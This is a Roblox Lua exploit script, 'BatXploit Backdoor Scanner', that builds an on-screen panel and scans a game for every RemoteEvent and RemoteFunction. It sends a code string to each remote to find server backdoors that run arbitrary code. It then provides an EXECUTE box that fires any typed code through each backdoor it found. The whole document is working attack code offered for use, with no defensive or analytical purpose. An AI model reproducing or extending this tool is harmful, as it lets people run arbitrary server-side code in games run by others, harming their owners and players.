-- BatXploit Backdoor Scanner (Lalol hub method) – РАБОТАЕТ
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 400)
frame.Position = UDim2.new(0.5, -250, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255,0,0)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,30)
title.BackgroundColor3 = Color3.fromRGB(30,0,0)
title.Text = "BatXploit Backdoor Scanner"
title.TextColor3 = Color3.fromRGB(255,0,0)
title.Parent = frame

local log = Instance.new("ScrollingFrame")
log.Size = UDim2.new(1,-20,0,250)
log.Position = UDim2.new(0,10,0,40)
log.BackgroundColor3 = Color3.fromRGB(20,20,20)
log.BorderSizePixel = 1
log.BorderColor3 = Color3.fromRGB(255,0,0)
log.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Parent = log

local scanBtn = Instance.new("TextButton")
scanBtn.Size = UDim2.new(0,150,0,35)
scanBtn.Position = UDim2.new(0,10,1,-45)
scanBtn.Text = "START SCAN"
scanBtn.BackgroundColor3 = Color3.fromRGB(50,0,0)
scanBtn.TextColor3 = Color3.new(1,1,1)
scanBtn.BorderSizePixel = 1
scanBtn.BorderColor3 = Color3.fromRGB(255,0,0)
scanBtn.Parent = frame

local backdoors = {}

local function add(text, col)
    local l = Instance.new("TextLabel")
    l.Text = text
    l.TextColor3 = col or Color3.new(1,1,1)
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Size = UDim2.new(1,0,0,20)
    l.BackgroundTransparency = 1
    l.Parent = log
    task.wait()
    log.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y)
end

local function randName()
    local s = ""
    for i=1,math.random(12,20) do s = s .. string.char(math.random(97,122)) end
    return s
end

local function test(remote, path)
    local name = randName()
    pcall(function()
        if remote:IsA("RemoteEvent") then remote:FireServer("a=Instance.new('Model',workspace)a.Name='"..name.."'")
        else remote:InvokeServer("a=Instance.new('Model',workspace)a.Name='"..name.."'") end
    end)
    for _=1,10 do
        task.wait(0.1)
        if workspace:FindFirstChild(name) then
            workspace[name]:Destroy()
            add("✅ BACKDOOR: "..path, Color3.new(0,1,0))
            table.insert(backdoors, remote)
            return true
        end
    end
    return false
end

local function scan()
    add("Scanning...", Color3.new(1,1,0))
    local remotes = {}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end
    add("Found "..#remotes.." remotes", Color3.new(1,1,0))
    for _,r in ipairs(remotes) do
        test(r, r:GetFullName())
        task.wait()
    end
    add("Found "..#backdoors.." backdoors", Color3.new(0,1,0))
    if #backdoors > 0 then
        local panel = Instance.new("Frame")
        panel.Size = UDim2.new(1,-20,0,80)
        panel.Position = UDim2.new(0,10,1,-90)
        panel.BackgroundColor3 = Color3.fromRGB(20,0,0)
        panel.BorderSizePixel = 1
        panel.BorderColor3 = Color3.fromRGB(255,0,0)
        panel.Parent = frame
        
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(0,250,0,50)
        box.Position = UDim2.new(0,10,0,15)
        box.Text = "print('BatXploit')"
        box.BackgroundColor3 = Color3.fromRGB(0,0,0)
        box.TextColor3 = Color3.new(1,1,1)
        box.Parent = panel
        
        local exec = Instance.new("TextButton")
        exec.Size = UDim2.new(0,100,0,50)
        exec.Position = UDim2.new(0,270,0,15)
        exec.Text = "EXECUTE"
        exec.BackgroundColor3 = Color3.fromRGB(50,0,0)
        exec.TextColor3 = Color3.new(1,1,1)
        exec.BorderSizePixel = 1
        exec.BorderColor3 = Color3.fromRGB(255,0,0)
        exec.Parent = panel
        
        exec.MouseButton1Click:Connect(function()
            for _,r in pairs(backdoors) do
                pcall(function()
                    if r:IsA("RemoteEvent") then r:FireServer(box.Text)
                    else r:InvokeServer(box.Text) end
                end)
            end
            add("Executed on "..#backdoors.." backdoors", Color3.new(1,0.5,0))
        end)
        add("Panel created at bottom", Color3.new(0,1,0))
    end
end

scanBtn.MouseButton1Click:Connect(scan)
add("Ready. Click START SCAN", Color3.new(0,1,0))
